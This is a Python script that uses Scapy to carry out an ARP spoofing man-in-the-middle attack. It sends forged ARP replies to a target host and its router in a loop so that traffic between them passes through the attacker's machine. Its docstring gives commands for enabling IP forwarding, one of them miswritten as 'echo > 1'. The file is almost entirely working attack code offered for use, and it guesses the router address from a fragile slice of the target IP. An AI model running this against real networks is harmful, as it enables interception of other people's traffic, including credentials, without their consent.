#!/usr/bin/env python3.11
"""
 - Simple Script Using Scapy To Perform ARP Spoof Attack .
 - Script logic :
   .1. Send ARP Response Packet To Target With Router-IP With My Own MAC Address .
   .2. Send ARP Response Packet To Router With Target-IP With My Own MAC Address .
   * This Results Target To Think That I'm The Router, And Router Will Think That I'm The Target Device .
   * Which Mean Any Traffic Between The Router And Target Will Go Through My Machine Before Reach Any Destination "Router | Target Machine"

 - Forward Packets :
 echo > 1 /proc/sys/net/ipv4/ip_forward
 sysctl -w net.ipv4.ip_forward=1
 vim etc/sysctl.conf : Uncomment or add net.ipv4.ip_forward = 1 .
 sysctl -p /etc/sysctl.conf
"""

from scapy.layers.l2 import ARP, Ether
from scapy.all import srp, send
from psutil import net_if_addrs
from time import sleep
from contextlib import suppress
from optparse import OptionParser

with suppress(KeyboardInterrupt) as ERR:
    USEROption: OptionParser = OptionParser()
    USEROption.add_option(
        "-I", "--interface", dest="INTERFACE", help="Attacker Interface Name "
    )
    USEROption.add_option(
        "-T", "--target", dest="TARGET", help="Target IP Address "
    )
    Opt, args = USEROption.parse_args()
    INTERFACE: str = Opt.INTERFACE
    TARGET: str = Opt.TARGET
    RouterIP = f"{TARGET[:12:1]}1"

    def SCANNER(TargetIP) -> str:
        """
        Sacn Network Devices And Store There IP And MAC Addresses .
        :return: IPs-MACs As Dictionary
        """

        ARPacket: ARP = ARP(
            op=1, psrc=net_if_addrs()[INTERFACE][0][1], pdst=TargetIP
        )
        EtherPart: Ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        AnsweredARPackets = srp(
            x=EtherPart / ARPacket, timeout=5, iface=INTERFACE, verbose=False
        )[0]
        for THW in AnsweredARPackets:
            return THW[1].src

    def ForgedPackets(TIP: str, ROUTER_IP: str) -> None:
        """
        op : ARP Packet Type .
        op=1 : Request  'Who-has'
        op=2 : Response .

        :param TIP: Target IP Address
        :param ROUTER_IP : Router IP Address
        :return: None
        """
        TARPart: ARP = ARP(
            op=2,
            pdst=TIP,
            psrc=ROUTER_IP,
            hwdst=SCANNER(TargetIP=TIP),
            hwsrc=net_if_addrs()[INTERFACE][2][1],
        )
        RARPart: ARP = ARP(
            op=2,
            pdst=ROUTER_IP,
            psrc=TIP,
            hwdst=SCANNER(TargetIP=ROUTER_IP),
            hwsrc=net_if_addrs()[INTERFACE][2][1],
        )
        PACKET_INDEX: int = 1
        while True:
            try:
                print(
                    f"\r[ATTACK-{PACKET_INDEX}] Packet Sent Successfully",
                    end="",
                )
                sleep(1.5)
                send(x=TARPart, iface=INTERFACE, verbose=False)
                send(x=RARPart, iface=INTERFACE, verbose=False)
                PACKET_INDEX += 1
            except KeyboardInterrupt:
                TARPart: ARP = ARP(
                    op=2,
                    pdst=TIP,
                    psrc=ROUTER_IP,
                    hwdst=SCANNER(TargetIP=TIP),
                    hwsrc=SCANNER(TargetIP=ROUTER_IP),
                )
                RARPart: ARP = ARP(
                    op=2,
                    pdst=ROUTER_IP,
                    psrc=TIP,
                    hwdst=SCANNER(TargetIP=ROUTER_IP),
                    hwsrc=SCANNER(TargetIP=TIP),
                )
                print("\n[ATTACK] RECOVERING TARGETS ARP TABLE")
                send(x=TARPart, verbose=False, iface=INTERFACE)
                send(x=RARPart, iface=INTERFACE, verbose=False)
                break

    ForgedPackets(TIP=TARGET, ROUTER_IP=RouterIP)

if ERR:
    print(f"[ERROR] {ERR}")
